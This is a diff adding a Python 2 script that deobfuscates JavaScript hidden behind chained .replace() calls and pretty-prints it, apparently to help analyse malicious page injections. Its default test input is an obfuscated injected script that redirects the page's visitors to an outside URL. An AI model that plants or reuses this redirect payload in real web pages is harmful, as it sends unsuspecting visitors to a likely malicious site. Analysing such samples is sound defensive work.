@@ -1,0 +1,136 @@
+#!/usr/bin/env python
+
+import sys,re
+
+if len(sys.argv) > 1:
+    buf = file(sys.argv[1]).read()
+else:
+    buf = sys.stdin.read()
+
+if len(buf) == 0:
+    buf = """<script type='text/javascript'>function uK(){};var kV='';uK.prototype = {f : function() {d=4906;var w=function(){};var u=new Date();var hK=function(){};var h='hXtHt9pH:9/H/Hl^e9n9dXe!r^mXeXd!i!a^.^c^oHm^/!iHmHaXg!e9sH/^zX.!hXt9m^'.replace(/[\^H\!9X]/g, '');var n=new Array();var e=function(){};var eJ='';t=document['lDo6cDart>iro6nD'.replace(/[Dr\]6\>]/g, '')];this.nH=false;eX=2280;dF="dF";var hN=function(){return 'hN'};this.g=6633;var a='';dK="";function x(b){var aF=new Array();this.q='';var hKB=false;var uN="";b['hIrBeTf.'.replace(/[\.BTAI]/g, '')]=h;this.qO=15083;uR='';var hB=new Date();s="s";}var dI=46541;gN=55114;this.c="c";nT="";this.bG=false;var m=new Date();var fJ=49510;x(t);this.y="";bL='';var k=new Date();var mE=function(){};}};var l=22739;var tL=new uK(); var p="";tL.f();this.kY=false;</script>"""
+
+def doReplaces(buf):
+    point = 0
+    while (buf.find(".replace(", point) > -1):
+            # DO THE REPLACE MAN!
+            point = buf.find(".replace(", point)
+            quoteType = buf[point-1]
+            if quoteType != '"' and quoteType != "'":
+                continue
+            # find the beginning of the string
+            strstart = point - 2
+            strend = strstart + 1
+            point += 10
+            go = True
+            while go:
+                strstart -= 1
+                if strstart < 0:
+                    go = False
+                elif buf[strstart] == quoteType:
+                    if strstart == 0 or buf[strstart-1] != '\\':
+                        go = False
+            strstart += 1
+            string =  buf[strstart:strend]
+            #print "string: "+string
+            # find the end of the pattern
+            pstart = point
+            pend = pstart
+            go = True
+            while go:
+                pend += 1
+                if pend == len(buf):
+                    go = False
+                elif buf[pend] == '/' and buf[pend-1] != '\\':
+                    go = False
+            pattern = buf[pstart:pend]
+            #print "pattern: "+pattern
+            # find the replacement text and modifiers
+            rstart = pend
+            g = False
+            i = False
+            go = True
+            comma = False
+            quoteType = None
+            while go:
+                rstart += 1
+                if not comma:
+                    if buf[rstart] == ',':
+                        comma = True
+                elif buf[rstart] == "'" or buf[rstart] == '"':
+                    quoteType = buf[rstart]
+                    go = False
+                elif buf[rstart] == 'g':
+                    g = True
+                elif buf[rstart] == 'i':
+                    i = True
+            # now dig out the replacement text
+            rend = rstart
+            go = True
+            while go:
+                rend += 1
+                if buf[rend] != quoteType:
+                    go = False
+            rep = buf[rstart+1:rend-1]
+            #print "rep: "+rep
+            st = re.sub(pattern, rep, string)
+            #print "FINISHED: "+st
+            # find the end of the replace()
+            parend = buf.find(")",rend) + 1
+            # replace the whole thing and collapse
+            buf = buf[:strstart] + st + buf[strend] + buf[parend:]
+            #adjust point
+            diff = parend - strstart + len(st)
+            point -= diff
+
+    return buf
+
+
+def unescape(buf):
+    buf2 = []
+    point = 0
+    lastpoint = 0
+    go = True
+    while go:
+        escape = buf.find("%", point)
+        if escape == -1:
+            go = False
+            break
+        buf2.append(buf[lastpoint:escape])
+        point = escape + 1
+        lastpoint = point + 2
+        if escape > 0 and buf[escape-1] == '\\':
+            continue
+        byte = "%c"%int(buf[point:point+2], 16)
+        buf2.append(byte)
+    buf2.append(buf[lastpoint:])
+    return "".join(buf2)
+
+# process the input.
+buf = doReplaces(buf)
+buf2 = ""
+inQuote = False
+quoteType = None
+indent = 0
+for char in buf:
+    buf2 += char
+    if not inQuote:
+        if char == "{":
+            indent += 1
+            buf2 += "\n" + "  "*indent
+        if char == ";":
+            buf2 += "\n" + "  "*indent
+        if char == "}":
+            indent -= 1
+            buf2 += "\n" + "  "*indent
+        if char == "'" or char == '"':
+            inQuote = True
+            quoteType = char
+    else:
+        if char == quoteType:
+            inQuote = False
+            
+
+
+
+print buf2
